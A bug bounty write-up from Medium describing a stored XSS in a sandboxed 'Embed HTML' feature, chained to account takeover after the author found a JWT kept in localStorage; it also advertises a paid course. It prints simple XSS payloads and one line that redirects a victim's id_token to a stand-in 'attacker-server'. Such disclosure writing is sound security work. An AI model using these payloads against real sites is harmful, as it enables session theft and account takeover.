---
title: Interesting Stored XSS in sandboxed environment to Full Account Takeover
url: https://infosecwriteups.com/interesting-stored-xss-in-sandboxed-environment-to-full-account-takeover-32e541062938?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2023-03-11
fetch_date: 2025-10-04T09:13:31.259876
---

# Interesting Stored XSS in sandboxed environment to Full Account Takeover

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F32e541062938&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Finteresting-stored-xss-in-sandboxed-environment-to-full-account-takeover-32e541062938&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Finteresting-stored-xss-in-sandboxed-environment-to-full-account-takeover-32e541062938&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-32e541062938---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-32e541062938---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Interesting Stored XSS in sandboxed environment to Full Account Takeover

[![Anurag__Verma](https://miro.medium.com/v2/resize:fill:64:64/1*ztIXKD8m9nIjY6Am8Tk5HQ@2x.jpeg)](https://varmaanu001.medium.com/?source=post_page---byline--32e541062938---------------------------------------)

[Anurag\_\_Verma](https://varmaanu001.medium.com/?source=post_page---byline--32e541062938---------------------------------------)

4 min read

·

Feb 27, 2023

--

1

Listen

Share

Hi readers 👋, Hope everyone of you doing well,

Before moving to the article content here is little announcement 📢,

In collaboration with TMG Security ([tmgsec.com](http://tmgsec.com)) we have successfully launched [**ADVANCED BUG BOUNTY HUNTING V1.0**](https://courses.tmgsec.com/courses/advance-bug-bounty-hunting-v1-0/) ,its a live training program starting from 10th march 2023 ,you can checkout the provided link and description is provided in the website.

***Course contains amazing content like this article and more with chaining vulnerabilities impacting to full account takeover and many more… as shown in attached image.***

This is just a trailer of the course content 🤑.

**Advanced bug bounty v1.0**: <https://courses.tmgsec.com/courses/advance-bug-bounty-hunting-v1-0/>

Press enter or click to view image in full size![]()

Press enter or click to view image in full size![]()

course syllabus

This is my new writeup related to interesting Stored Cross Scripting where i was able to bypass sandbox restriction additionally i was able to bypass httponly enabled restriction.

Lets get started,

*Little About Sandboxing??*

Sandboxing is a technique in which you create an isolated test environment, a “sandbox,” in which to execute or “detonate” a suspicious file or URL that is attached to an email or otherwise reaches your network and then observe what happens. If the file or URL displays malicious behavior, then you’ve discovered a new threat. The sandbox must be a secure, virtual environment that accurately emulates the CPU of your production servers.

*reference:* [*https://buildyourfuture.withgoogle.com/programs/google-sandbox*](https://buildyourfuture.withgoogle.com/programs/google-sandbox)

let us consider the target be target.com

Found a Embed HTML feature

![]()

embed feature

as you can see there are two features Embed URL and Embed HTML ,

First i tried using URL embed so i used ngrok to serve some payloads i tried for SSRF too like try for fetching internal server meta data like ec2,localhost in this case,but i didn’t succeeded for the ssrf so i moved on to xss.

Press enter or click to view image in full size

![]()

i tried for lots of paylods like svg,xml,js etc.but got hit for just html and just got iframe injection which was not able to access target DOM .

you can see in below screenhost **document.domain** showing ngrok link not he target means the payload runs in context to ngrok not the target.

Press enter or click to view image in full size

![]()

now i tried to embed simple payloads like

<script>alert(1)</script>,<script>confirm(1)</script>,print(1),prompt(1)

<img src=x onerror=prompt(1)> etc….

but the application refuses to run the payload due to the sandboxing.

Press enter or click to view image in full size

![]()

you can see above screenshot showing sandbox blocking the payloads.

Now ,no issue if **alert(),confirm(),print(),prompt()** are blocked our aim is to access victim DOM ,then i tried to simply access the DOM elements using payloads like **console.log(document.cookie)** and it worked .

Press enter or click to view image in full size

![]()

document.cookie working successfully

I quickly reported the issue to the team and they triaged the issue

But wait,there is some twist the main cookies (the sensitive one) in this case were JWT tokens are httponly set to true,means the cookies i was getting are just meta or non sensitive cookie.

Press enter or click to view image in full size

![]()

sensitive cookies set to httponly true

and therefore the company gives p4 priority to the issue which means it still considered a low issue.

![]()

low issue

I took some time to chain it to full account takeover and finally i found additional flaw in the application i noticed the same sensitive token were stored in the localStorage as id\_token parameter.

Press enter or click to view image in full size

![]()

sensitive token stored in localStorage

I confirmed using burpcollaborator and tried to hijack the localstorage sensitive token and it worked successfully.

using payload like:

```
document.location="https://attacker-server?victim_jwt_token"+document.localStorage.getItem("id_token")
```

**document.location=”https://attacker-server?victim\_jwt\_token”+document.localStorage.getItem(“id\_token”)**

Press enter or click to view image in full size

![]()

Then i confirmed account takeover and quickly added to comments in previous report and company confirm the reproduce the issue and team quickly updates the issue and increase the severity to p2.

Press enter or click to view image in full size

![]()

**The Issue is resolved now ✅**

I have upload video poc for the same on my channel so you can checkout the channel as well.

For other Interesting courses(Web/API/Android) checkout website link:<https://courses.tmgsec.com/courses>

For further queries you can reach out at: support@tmgsec.com

Hope you like the content ,thanks for reading.

suggestions are welcome.

Connect me

Youtube channel: [**redirect \_poc**](https://www.youtube.com/channel/UCq7-Qf45etdk0qc35I_n7PQ?sub_confirmation=1)

Linkedin: [**my\_linkedin**](http://linkedin.com/in/anurag-verma-650b771a2)

Instagram : **varmaanu001**

buy me a coffee 😍: [here](https://www.buymeacoffee.com/redirectpoc)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----32e541062938---------------------------------------)

[Bug Bounty Tips](https://medium...